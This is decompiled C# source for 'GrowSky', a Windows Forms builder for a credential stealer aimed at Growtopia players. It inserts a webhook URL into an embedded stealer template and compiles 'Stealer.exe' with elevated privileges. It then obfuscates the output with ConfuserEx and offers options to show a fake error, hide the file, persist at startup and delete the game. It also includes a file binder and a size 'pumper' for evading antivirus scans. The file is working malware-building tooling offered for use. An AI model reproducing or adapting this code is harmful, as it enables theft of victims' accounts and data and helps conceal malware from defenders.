using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Threading;
using System.Windows.Forms;
using GrowSky.Properties;
using MetroFramework.Controls;
using MetroFramework.Forms;

namespace GrowSky
{
	// Token: 0x02000005 RID: 5
	public class Main : MetroForm
	{
		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000018 RID: 24 RVA: 0x00002106 File Offset: 0x00000306
		// (set) Token: 0x06000019 RID: 25 RVA: 0x0000210E File Offset: 0x0000030E
		public string IcoFilePath { get; private set; }

		// Token: 0x0600001A RID: 26 RVA: 0x00002117 File Offset: 0x00000317
		public Main()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002C24 File Offset: 0x00000E24
		private void Pumpexemb(decimal size, string path)
		{
			FileStream fileStream = File.OpenWrite(path);
			long num = fileStream.Seek(0L, SeekOrigin.End);
			decimal d = size * 1048576m;
			while (num < d)
			{
				num += 1L;
				fileStream.WriteByte(0);
			}
			fileStream.Close();
		}

		// Token: 0x0600001C RID: 28 RVA: 0x0000212F File Offset: 0x0000032F
		private void Form2_Load(object sender, EventArgs e)
		{
			openanimation.AnimateWindow(base.Handle, 1000, 16);
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000020BA File Offset: 0x000002BA
		private void metroTabPage1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000020B0 File Offset: 0x000002B0
		private void metroButton1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002145 File Offset: 0x00000345
		private void pictureBox1_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCbAqdlIw2QX-d8FBE6Q0Ivw?view_as=subscriber");
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00002C7C File Offset: 0x00000E7C
		private void metroButton3_Click(object sender, EventArgs e)
		{
			bool flag = !string.IsNullOrEmpty(this.Webhook.Text);
			if (flag)
			{
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.FileName = "Stealer.exe";
				saveFileDialog.Filter = "Exe files (*.exe)|*.exe";
				bool flag2 = saveFileDialog.ShowDialog() == DialogResult.OK;
				if (flag2)
				{
					this.compile(saveFileDialog.FileName);
				}
			}
			else
			{
				MessageBox.Show("Missing webhook URL");
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002CEC File Offset: 0x00000EEC
		public void compile(string path)
		{
			string text = Resources.Code;
			text = this.BuildBase(text);
			List<string> list = new List<string>();
			list.Add(text);
			string contents = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">\r\n  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\r\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\r\n    <security>\r\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\r\n        <requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\" />\r\n      </requestedPrivileges>\r\n    </security>\r\n  </trustInfo>\r\n  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\r\n    <application>\r\n    </application>\r\n  </compatibility>\r\n</assembly>\r\n";
			File.WriteAllText(Application.StartupPath + "\\manifest.manifest", contents);
			CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
			CompilerParameters compilerParameters = new CompilerParameters();
			compilerParameters.ReferencedAssemblies.Add("System.Net.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Net.Http.dll");
			compilerParameters.ReferencedAssemblies.Add("System.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.compression.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Security.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			string text2 = pathRoot + "Temp";
			try
			{
				Directory.CreateDirectory(text2);
				File.Delete(text2 + "\\ConfuserEx.zip");
				Directory.Delete(text2 + "ConfuserEx", true);
				File.Delete(Path.GetDirectoryName(path) + "\\Names.txt");
			}
			catch
			{
			}
			File.WriteAllBytes(text2 + "\\ConfuserEx.zip", Resources.ConfuserEx);
			ZipFile.ExtractToDirectory(text2 + "\\ConfuserEx.zip", text2 + "\\ConfuserEx");
			string contents2 = string.Join(Environment.NewLine, new string[]
			{
				"<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
				string.Concat(new string[]
				{
					"<project outputDir=\"",
					Path.GetDirectoryName(path),
					"\" baseDir=\"",
					Path.GetDirectoryName(path),
					"\" xmlns=\"http://confuser.codeplex.com\">"
				}),
				"  <rule pattern=\"true\" inherit=\"false\">",
				"    <protection id=\"anti de4dot\" />",
				"    <protection id=\"anti ildasm\" />",
				"    <protection id=\"anti tamper\" />",
				"    <protection id=\"anti watermark\" />",
				"    <protection id=\"constant mutate\" />",
				"    <protection id=\"constants\" />",
				"    <protection id=\"ctrl flow\" />",
				"    <protection id=\"integrity prot\" />",
				"    <protection id=\"invalid metadata\" />",
				"    <protection id=\"invalid cctor\" />",
				"    <protection id=\"junk\" />",
				"    <protection id=\"module properties\" />",
				"    <protection id=\"opcode prot\" />",
				"    <protection id=\"reduce md\" />",
				"    <protection id=\"ref proxy\" />",
				"    <protection id=\"stack underflow\" />",
				"    <protection id=\"rename\" />",
				"  </rule>",
				"  <module path=\"" + Path.GetFileName(path) + "\" />",
				"</project>"
			});
			File.WriteAllText(text2 + "\\ConfuserEx\\198v2\\obf.crproj", contents2);
			File.Copy(text2 + "\\ConfuserEx\\198v2\\Names.txt", Path.GetDirectoryName(path) + "\\Names.txt");
			compilerParameters.GenerateExecutable = true;
			compilerParameters.OutputAssembly = path;
			compilerParameters.GenerateInMemory = false;
			compilerParameters.TreatWarningsAsErrors = false;
			CompilerParameters compilerParameters2 = compilerParameters;
			compilerParameters2.CompilerOptions += "/t:winexe /unsafe /platform:x86";
			bool flag = !string.IsNullOrEmpty(this.metroTextBox7.Text) || (!string.IsNullOrWhiteSpace(this.metroTextBox7.Text) && this.metroTextBox7.Text.Contains("\\") && this.metroTextBox7.Text.Contains(":") && this.metroTextBox7.Text.Length >= 7);
			if (flag)
			{
				CompilerParameters compilerParameters3 = compilerParameters;
				compilerParameters3.CompilerOptions = compilerParameters3.CompilerOptions + " /win32icon:\"" + this.metroTextBox7.Text + "\"";
			}
			else
			{
				bool flag2 = string.IsNullOrEmpty(this.metroTextBox7.Text) || string.IsNullOrWhiteSpace(this.metroTextBox7.Text);
				if (flag2)
				{
				}
			}
			bool flag3 = this.bindlist.Items.Count > 0;
			if (flag3)
			{
				foreach (object obj in this.bindlist.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					compilerParameters.EmbeddedResources.Add(listViewItem.SubItems[0].Text ?? "");
				}
			}
			Thread.Sleep(100);
			CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, list.ToArray());
			bool flag4 = compilerResults.Errors.Count > 0;
			if (flag4)
			{
				try
				{
					File.Delete(Application.StartupPath + "\\manifest.manifest");
				}
				catch
				{
				}
				foreach (object obj2 in compilerResults.Errors)
				{
					CompilerError compilerError = (CompilerError)obj2;
					MessageBox.Show(compilerError.ToString());
				}
			}
			else
			{
				try
				{
					File.Delete(Application.StartupPath + "\\manifest.manifest");
				}
				catch
				{
				}
				Process process = new Process();
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.WorkingDirectory = text2 + "\\ConfuserEx\\198v2";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.Arguments = "/C Confuser.CLI obf.crproj";
				process.Start();
				process.WaitForExit();
				try
				{
					File.Delete(text2 + "\\ConfuserEx.zip");
					Directory.Delete(text2 + "\\ConfuserEx", true);
					File.Delete(Path.GetDirectoryName(path) + "\\Names.txt");
				}
				catch
				{
				}
				MessageBox.Show("Stealer compiled!");
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x0000335C File Offset: 0x0000155C
		public string BuildBase(string code)
		{
			string text = code.Replace("webhook_url", this.Webhook.Text);
			bool flag = this.metroCheckBox4.Checked && !string.IsNullOrEmpty(this.fakeerrormessage.Text);
			if (flag)
			{
				text = text.Replace("//FakeErrorMessage", "MessageBox.Show(\"" + this.fakeerrormessage.Text + "\",\"Error!\",MessageBoxButtons.OK);");
			}
			bool @checked = this.metroCheckBox2.Checked;
			if (@checked)
			{
				text = text.Replace("//HideStealer", "try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }");
			}
			bool checked2 = this.metroCheckBox1.Checked;
			if (checked2)
			{
				text = text.Replace("//Tracer", "Tracer.TraceSave();");
			}
			bool checked3 = this.metroCheckBox5.Checked;
			if (checked3)
			{
				text = text.Replace("//DeleteGrowtopia", "DeleteGrowtopia();");
			}
			bool checked4 = this.metroCheckBox6.Checked;
			if (checked4)
			{
				text = text.Replace("//RunOnStartup", "RunOnStartup();");
			}
			return text;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x000020BA File Offset: 0x000002BA
		private void Builder_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003468 File Offset: 0x00001668
		private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			bool flag = !this.metroCheckBox4.Checked;
			if (flag)
			{
				this.fakeerrormessage.Visible = false;
			}
			else
			{
				this.fakeerrormessage.Visible = true;
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x000020BA File Offset: 0x000002BA
		private void Webhook_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000026 RID: 38 RVA: 0x000020BA File Offset: 0x000002BA
		private void fakeerrormessage_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000027 RID: 39 RVA: 0x000034A8 File Offset: 0x000016A8
		private void metroButton5_Click(object sender, EventArgs e)
		{
			using (new OpenFileDialog())
			{
				OpenFileDialog openFileDialog2 = new OpenFileDialog();
				openFileDialog2.Filter = "Ico files (*ico)|*.ico";
				openFileDialog2.Title = "Select an ico file";
				DialogResult dialogResult = openFileDialog2.ShowDialog();
				bool flag = dialogResult == DialogResult.OK;
				if (flag)
				{
					this.pictureBox4.Load(openFileDialog2.FileName);
					this.pictureBox4.SizeMode = PictureBoxSizeMode.StretchImage;
					this.IcoFilePath = openFileDialog2.FileName;
					this.metroTextBox7.Clear();
					this.metroTextBox7.Text = this.IcoFilePath;
				}
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x000020BA File Offset: 0x000002BA
		private void metroCheckBox2_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000020BA File Offset: 0x000002BA
		private void metroButton4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000020BA File Offset: 0x000002BA
		private void KB_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002B RID: 43 RVA: 0x000020BA File Offset: 0x000002BA
		private void metroButton6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002C RID: 44 RVA: 0x000020BA File Offset: 0x000002BA
		private void MB_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002D RID: 45 RVA: 0x000020BA File Offset: 0x000002BA
		private void numericUpDown1_ValueChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002E RID: 46 RVA: 0x000020BA File Offset: 0x000002BA
		private void groupBox3_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002F RID: 47 RVA: 0x000020BA File Offset: 0x000002BA
		private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000020BA File Offset: 0x000002BA
		private void metroTextBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00002153 File Offset: 0x00000353
		private void pictureBox3_Click(object sender, EventArgs e)
		{
			Process.Start("https://github.com/StormyGithub");
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00002161 File Offset: 0x00000361
		private void pictureBox2_Click(object sender, EventArgs e)
		{
			Process.Start("https://twitch.tv/stormtwitchxd");
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000020F9 File Offset: 0x000002F9
		private void metroButton2_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000020BA File Offset: 0x000002BA
		private void Pumper_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000035 RID: 53 RVA: 0x000020BA File Offset: 0x000002BA
		private void groupBox3_Enter_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00003554 File Offset: 0x00001754
		private void metroButton4_Click_1(object sender, EventArgs e)
		{
			bool @checked = this.bunifuCheckbox1.Checked;
			if (@checked)
			{
				this.openFileDialog1.Filter = "Exe Files (.exe)|*.exe|All Files (*.*)|*.*";
				this.openFileDialog1.FilterIndex = 1;
				DialogResult dialogResult = this.openFileDialog1.ShowDialog();
				bool flag = dialogResult == DialogResult.OK;
				if (flag)
				{
					this.Pumpexemb(this.numericUpDown1.Value, this.openFileDialog1.FileName);
				}
			}
		}

		// Token: 0x06000037 RID: 55 RVA: 0x000020BA File Offset: 0x000002BA
		private void bunifuCheckbox1_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000038 RID: 56 RVA: 0x000020BA File Offset: 0x000002BA
		private void bunifuCheckbox2_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000020BA File Offset: 0x000002BA
		private void openFileDialog1_FileOk_1(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x0600003A RID: 58 RVA: 0x000020BA File Offset: 0x000002BA
		private void metroTextBox4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003B RID: 59 RVA: 0x000020BA File Offset: 0x000002BA
		private void Binder_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000020BA File Offset: 0x000002BA
		private void openFileDialog_FileOk(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x0600003D RID: 61 RVA: 0x000020BA File Offset: 0x000002BA
		private void AddFilesToBind_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000020BA File Offset: 0x000002BA
		private void RemoveSelected_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000020BA File Offset: 0x000002BA
		private void ToggleExe_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000020BA File Offset: 0x000002BA
		private void ToggleRunAsAdmin_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000041 RID: 65 RVA: 0x0000216F File Offset: 0x0000036F
		private void fakeerrormessage_Click_1(object sender, EventArgs e)
		{
			this.fakeerrormessage.Text = "";
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000020BA File Offset: 0x000002BA
		private void Webhook_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000020BA File Offset: 0x000002BA
		private void metroTextBox7_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000020BA File Offset: 0x000002BA
		private void metroTrackBar1_Scroll(object sender, ScrollEventArgs e)
		{
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000020BA File Offset: 0x000002BA
		private void metroButton6_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000020BA File Offset: 0x000002BA
		private void listView1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000020BA File Offset: 0x000002BA
		private void button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000020BA File Offset: 0x000002BA
		private void bindlist_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000035C4 File Offset: 0x000017C4
		private void removebindfiles_Click(object sender, EventArgs e)
		{
			bool flag = this.bindlist.Items.Count > 0;
			if (flag)
			{
				this.bindlist.Items.Remove(this.bindlist.SelectedItems[0]);
			}
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00003610 File Offset: 0x00001810
		private void bindfiles_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Find File To Bind";
			openFileDialog.Filter = "All files (*.*)|*.*;";
			openFileDialog.FileName = "GrowSky";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				string[] fileNames = openFileDialog.FileNames;
				for (int i = 0; i < fileNames.Length; i++)
				{
					ListViewItem value = new ListViewItem(openFileDialog.FileNames);
					this.bindlist.Items.Add(value);
				}
			}
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00003694 File Offset: 0x00001894
		protected override void Dispose(bool disposing)
		{
			bool flag = disposing && this.components != null;
			if (flag)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000036CC File Offset: 0x000018CC
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Main));
			this.metroTabControl1 = new MetroTabControl();
			this.Home = new MetroTabPage();
			this.label1 = new Label();
			this.metroComboBox1 = new MetroComboBox();
			this.metroLabel2 = new MetroLabel();
			this.metroTextBox1 = new MetroTextBox();
			this.groupBox1 = new GroupBox();
			this.pictureBox3 = new PictureBox();
			this.pictureBox2 = new PictureBox();
			this.pictureBox1 = new PictureBox();
			this.Builder = new MetroTabPage();
			this.Webhook = new MetroTextBox();
			this.metroLabel3 = new MetroLabel();
			this.metroTextBox2 = new MetroTextBox();
			this.metroLabel10 = new MetroLabel();
			this.metroTextBox7 = new MetroTextBox();
			this.metroLabel9 = new MetroLabel();
			this.metroButton5 = new MetroButton();
			this.metroButton3 = new MetroButton();
			this.groupBox2 = new GroupBox();
			this.fakeerrormessage = new MetroTextBox();
			this.metroCheckBox6 = new MetroCheckBox();
			this.metroCheckBox3 = new MetroCheckBox();
			this.metroCheckBox4 = new MetroCheckBox();
			this.metroCheckBox2 = new MetroCheckBox();
			this.metroCheckBox5 = new MetroCheckBox();
			this.metroCheckBox1 = new MetroCheckBox();
			this.metroLabel1 = new MetroLabel();
			this.pictureBox4 = new PictureBox();
			this.Binder = new MetroTabPage();
			this.bindlist = new ListView();
			this.columnHeader1 = new ColumnHeader();
			this.metroLabel4 = new MetroLabel();
			this.metroTextBox3 = new MetroTextBox();
			this.Pumper = new MetroTabPage();
			this.metroLabel6 = new MetroLabel();
			this.metroButton4 = new MetroButton();
			this.numericUpDown1 = new NumericUpDown();
			this.metroLabel5 = new MetroLabel();
			this.metroTextBox6 = new MetroTextBox();
			this.groupBox3 = new GroupBox();
			this.bunifuCheckbox1 = new MetroCheckBox();
			this.Proxy = new MetroTabPage();
			this.metroButton1 = new MetroButton();
			this.metroButton2 = new MetroButton();
			this.saveFileDialog1 = new SaveFileDialog();
			this.openFileDialog = new OpenFileDialog();
			this.label3 = new Label();
			this.openFileDialog1 = new OpenFileDialog();
			this.removebindfiles = new MetroButton();
			this.bindfiles = new MetroButton();
			this.metroTabControl1.SuspendLayout();
			this.Home.SuspendLayout();
			this.groupBox1.SuspendLayout();
			((ISupportInitialize)this.pictureBox3).BeginInit();
			((ISupportInitialize)this.pictureBox2).BeginInit();
			((ISupportInitialize)this.pictureBox1).BeginInit();
			this.Builder.SuspendLayout();
			this.groupBox2.SuspendLayout();
			((ISupportInitialize)this.pictureBox4).BeginInit();
			this.Binder.SuspendLayout();
			this.Pumper.SuspendLayout();
			((ISupportInitialize)this.numericUpDown1).BeginInit();
			this.groupBox3.SuspendLayout();
			base.SuspendLayout();
			this.metroTabControl1.Controls.Add(this.Home);
			this.metroTabControl1.Controls.Add(this.Builder);
			this.metroTabControl1.Controls.Add(this.Binder);
			this.metroTabControl1.Controls.Add(this.Pumper);
			this.metroTabControl1.Controls.Add(this.Proxy);
			this.metroTabControl1.Location = new Point(23, 33);
			this.metroTabControl1.Name = "metroTabControl1";
			this.metroTabControl1.SelectedIndex = 0;
			this.metroTabControl1.Size = new Size(827, 422);
			this.metroTabControl1.TabIndex = 0;
			this.metroTabControl1.Theme = 2;
			this.Home.Controls.Add(this.label1);
			this.Home.Controls.Add(this.metroComboBox1);
			this.Home.Controls.Add(this.metroLabel2);
			this.Home.Controls.Add(this.metroTextBox1);
			this.Home.Controls.Add(this.groupBox1);
			this.Home.ForeColor = Color.White;
			this.Home.HorizontalScrollbarBarColor = true;
			this.Home.Location = new Point(4, 35);
			this.Home.Name = "Home";
			this.Home.Size = new Size(819, 383);
			this.Home.Style = 3;
			this.Home.TabIndex = 0;
			this.Home.Text = "     Main     ";
			this.Home.Theme = 2;
			this.Home.VerticalScrollbarBarColor = true;
			this.label1.AutoSize = true;
			this.label1.BackColor = Color.Black;
			this.label1.Enabled = false;
			this.label1.Location = new Point(571, 292);
			this.label1.Name = "label1";
			this.label1.Size = new Size(30, 13);
			this.label1.TabIndex = 35;
			this.label1.Text = "Style";
			this.metroComboBox1.Enabled = false;
			this.metroComboBox1.FormattingEnabled = true;
			this.metroComboBox1.ItemHeight = 23;
			this.metroComboBox1.Items.AddRange(new object[]
			{
				"Default",
				"White",
				"Brown",
				"Yellow",
				"Orange",
				"Green",
				"Lime",
				"Silver"
			});
			this.metroComboBox1.Location = new Point(613, 284);
			this.metroComboBox1.Name = "metroComboBox1";
			this.metroComboBox1.Size = new Size(150, 29);
			this.metroComboBox1.TabIndex = 34;
			this.metroComboBox1.Theme = 2;
			this.metroLabel2.AutoSize = true;
			this.metroLabel2.BackColor = Color.Black;
			this.metroLabel2.FontWeight = 1;
			this.metroLabel2.ForeColor = Color.White;
			this.metroLabel2.Location = new Point(4, 357);
			this.metroLabel2.Name = "metroLabel2";
			this.metroLabel2.Size = new Size(56, 19);
			this.metroLabel2.TabIndex = 33;
			this.metroLabel2.Text = "License:";
			this.metroLabel2.Theme = 2;
			this.metroLabel2.UseStyleColors = true;
			this.metroTextBox1.Enabled = false;
			this.metroTextBox1.Location = new Point(60, 357);
			this.metroTextBox1.Name = "metroTextBox1";
			this.metroTextBox1.PasswordChar = '●';
			this.metroTextBox1.ReadOnly = true;
			this.metroTextBox1.Size = new Size(118, 23);
			this.metroTextBox1.Style = 3;
			this.metroTextBox1.TabIndex = 32;
			this.metroTextBox1.Text = "Licensenumberlol";
			this.metroTextBox1.Theme = 2;
			this.metroTextBox1.UseStyleColors = true;
			this.metroTextBox1.UseSystemPasswordChar = true;
			this.metroTextBox1.Click += this.metroTextBox1_Click;
			this.groupBox1.BackColor = Color.Black;
			this.groupBox1.Controls.Add(this.pictureBox3);
			this.groupBox1.Controls.Add(this.pictureBox2);
			this.groupBox1.Controls.Add(this.pictureBox1);
			this.groupBox1.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.groupBox1.ForeColor = Color.White;
			this.groupBox1.Location = new Point(13, 228);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Size = new Size(489, 121);
			this.groupBox1.TabIndex = 4;
			this.groupBox1.TabStop = false;
			this.groupBox1.Text = "Social Medias";
			this.pictureBox3.Cursor = Cursors.Hand;
			this.pictureBox3.Image = (Image)componentResourceManager.GetObject("pictureBox3.Image");
			this.pictureBox3.Location = new Point(329, 28);
			this.pictureBox3.Name = "pictureBox3";
			this.pictureBox3.Size = new Size(154, 87);
			this.pictureBox3.SizeMode = PictureBoxSizeMode.StretchImage;
			this.pictureBox3.TabIndex = 2;
			this.pictureBox3.TabStop = false;
			this.pictureBox3.Click += this.pictureBox3_Click;
			this.pictureBox2.Cursor = Cursors.Hand;
			this.pictureBox2.Image = (Image)componentResourceManager.GetObject("pictureBox2.Image");
			this.pictureBox2.Location = new Point(169, 28);
			this.pictureBox2.Name = "pictureBox2";
			this.pictureBox2.Size = new Size(154, 87);
			this.pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
			this.pictureBox2.TabIndex = 1;
			this.pictureBox2.TabStop = false;
			this.pictureBox2.Click += this.pictureBox2_Click;
			this.pictureBox1.Cursor = Cursors.Hand;
			this.pictureBox1.Image = (Image)componentResourceManager.GetObject("pictureBox1.Image");
			this.pictureBox1.Location = new Point(9, 28);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new Size(154, 87);
			this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.pictureBox1.TabIndex = 0;
			this.pictureBox1.TabStop = false;
			this.pictureBox1.Click += this.pictureBox1_Click;
			this.Builder.Controls.Add(this.Webhook);
			this.Builder.Controls.Add(this.metroLabel3);
			this.Builder.Controls.Add(this.metroTextBox2);
			this.Builder.Controls.Add(this.metroLabel10);
			this.Builder.Controls.Add(this.metroTextBox7);
			this.Builder.Controls.Add(this.metroLabel9);
			this.Builder.Controls.Add(this.metroButton5);
			this.Builder.Controls.Add(this.metroButton3);
			this.Builder.Controls.Add(this.groupBox2);
			this.Builder.Controls.Add(this.metroLabel1);
			this.Builder.Controls.Add(this.pictureBox4);
			this.Builder.HorizontalScrollbarBarColor = true;
			this.Builder.Location = new Point(4, 35);
			this.Builder.Name = "Builder";
			this.Builder.Size = new Size(819, 383);
			this.Builder.Style = 3;
			this.Builder.TabIndex = 1;
			this.Builder.Text = "     Builder     ";
			this.Builder.Theme = 2;
			this.Builder.VerticalScrollbarBarColor = true;
			this.Builder.Click += this.Builder_Click;
			this.Webhook.Location = new Point(178, 33);
			this.Webhook.Name = "Webhook";
			this.Webhook.Size = new Size(604, 23);
			this.Webhook.Style = 3;
			this.Webhook.TabIndex = 36;
			this.Webhook.Theme = 2;
			this.Webhook.UseStyleColors = true;
			this.Webhook.Click += this.Webhook_Click_1;
			this.metroLabel3.AutoSize = true;
			this.metroLabel3.BackColor = Color.Black;
			this.metroLabel3.FontWeight = 1;
			this.metroLabel3.ForeColor = Color.White;
			this.metroLabel3.Location = new Point(4, 357);
			this.metroLabel3.Name = "metroLabel3";
			this.metroLabel3.Size = new Size(56, 19);
			this.metroLabel3.TabIndex = 35;
			this.metroLabel3.Text = "License:";
			this.metroLabel3.Theme = 2;
			this.metroLabel3.UseStyleColors = true;
			this.metroTextBox2.Enabled = false;
			this.metroTextBox2.Location = new Point(60, 357);
			this.metroTextBox2.Name = "metroTextBox2";
			this.metroTextBox2.PasswordChar = '●';
			this.metroTextBox2.ReadOnly = true;
			this.metroTextBox2.Size = new Size(118, 23);
			this.metroTextBox2.Style = 3;
			this.metroTextBox2.TabIndex = 34;
			this.metroTextBox2.Text = "Licensenumberlol";
			this.metroTextBox2.Theme = 2;
			this.metroTextBox2.UseStyleColors = true;
			this.metroTextBox2.UseSystemPasswordChar = true;
			this.metroLabel10.AutoSize = true;
			this.metroLabel10.BackColor = Color.Black;
			this.metroLabel10.FontWeight = 1;
			this.metroLabel10.ForeColor = Color.White;
			this.metroLabel10.Location = new Point(530, 145);
			this.metroLabel10.Name = "metroLabel10";
			this.metroLabel10.Size = new Size(70, 19);
			this.metroLabel10.TabIndex = 30;
			this.metroLabel10.Text = "Icon path:";
			this.metroLabel10.Theme = 2;
			this.metroLabel10.UseStyleColors = true;
			this.metroTextBox7.Enabled = false;
			this.metroTextBox7.Location = new Point(530, 171);
			this.metroTextBox7.Name = "metroTextBox7";
			this.metroTextBox7.ReadOnly = true;
			this.metroTextBox7.Size = new Size(252, 23);
			this.metroTextBox7.Style = 3;
			this.metroTextBox7.TabIndex = 31;
			this.metroTextBox7.Theme = 2;
			this.metroTextBox7.UseStyleColors = true;
			this.metroTextBox7.Click += this.metroTextBox7_Click;
			this.metroLabel9.AutoSize = true;
			this.metroLabel9.BackColor = Color.Black;
			this.metroLabel9.FontWeight = 1;
			this.metroLabel9.ForeColor = Color.White;
			this.metroLabel9.Location = new Point(601, 88);
			this.metroLabel9.Name = "metroLabel9";
			this.metroLabel9.Size = new Size(87, 19);
			this.metroLabel9.TabIndex = 26;
			this.metroLabel9.Text = "Custom Icon";
			this.metroLabel9.Theme = 2;
			this.metroLabel9.UseStyleColors = true;
			this.metroButton5.Cursor = Cursors.Hand;
			this.metroButton5.Highlight = true;
			this.metroButton5.Location = new Point(601, 110);
			this.metroButton5.Name = "metroButton5";
			this.metroButton5.Size = new Size(95, 23);
			this.metroButton5.Style = 3;
			this.metroButton5.TabIndex = 28;
			this.metroButton5.Text = "Select icon";
			this.metroButton5.Theme = 2;
			this.metroButton5.Click += this.metroButton5_Click;
			this.metroButton3.Cursor = Cursors.Hand;
			this.metroButton3.Highlight = true;
			this.metroButton3.Location = new Point(721, 329);
			this.metroButton3.Name = "metroButton3";
			this.metroButton3.Size = new Size(88, 44);
			this.metroButton3.Style = 3;
			this.metroButton3.TabIndex = 24;
			this.metroButton3.Text = "Build Stealer";
			this.metroButton3.Theme = 2;
			this.metroButton3.Click += this.metroButton3_Click;
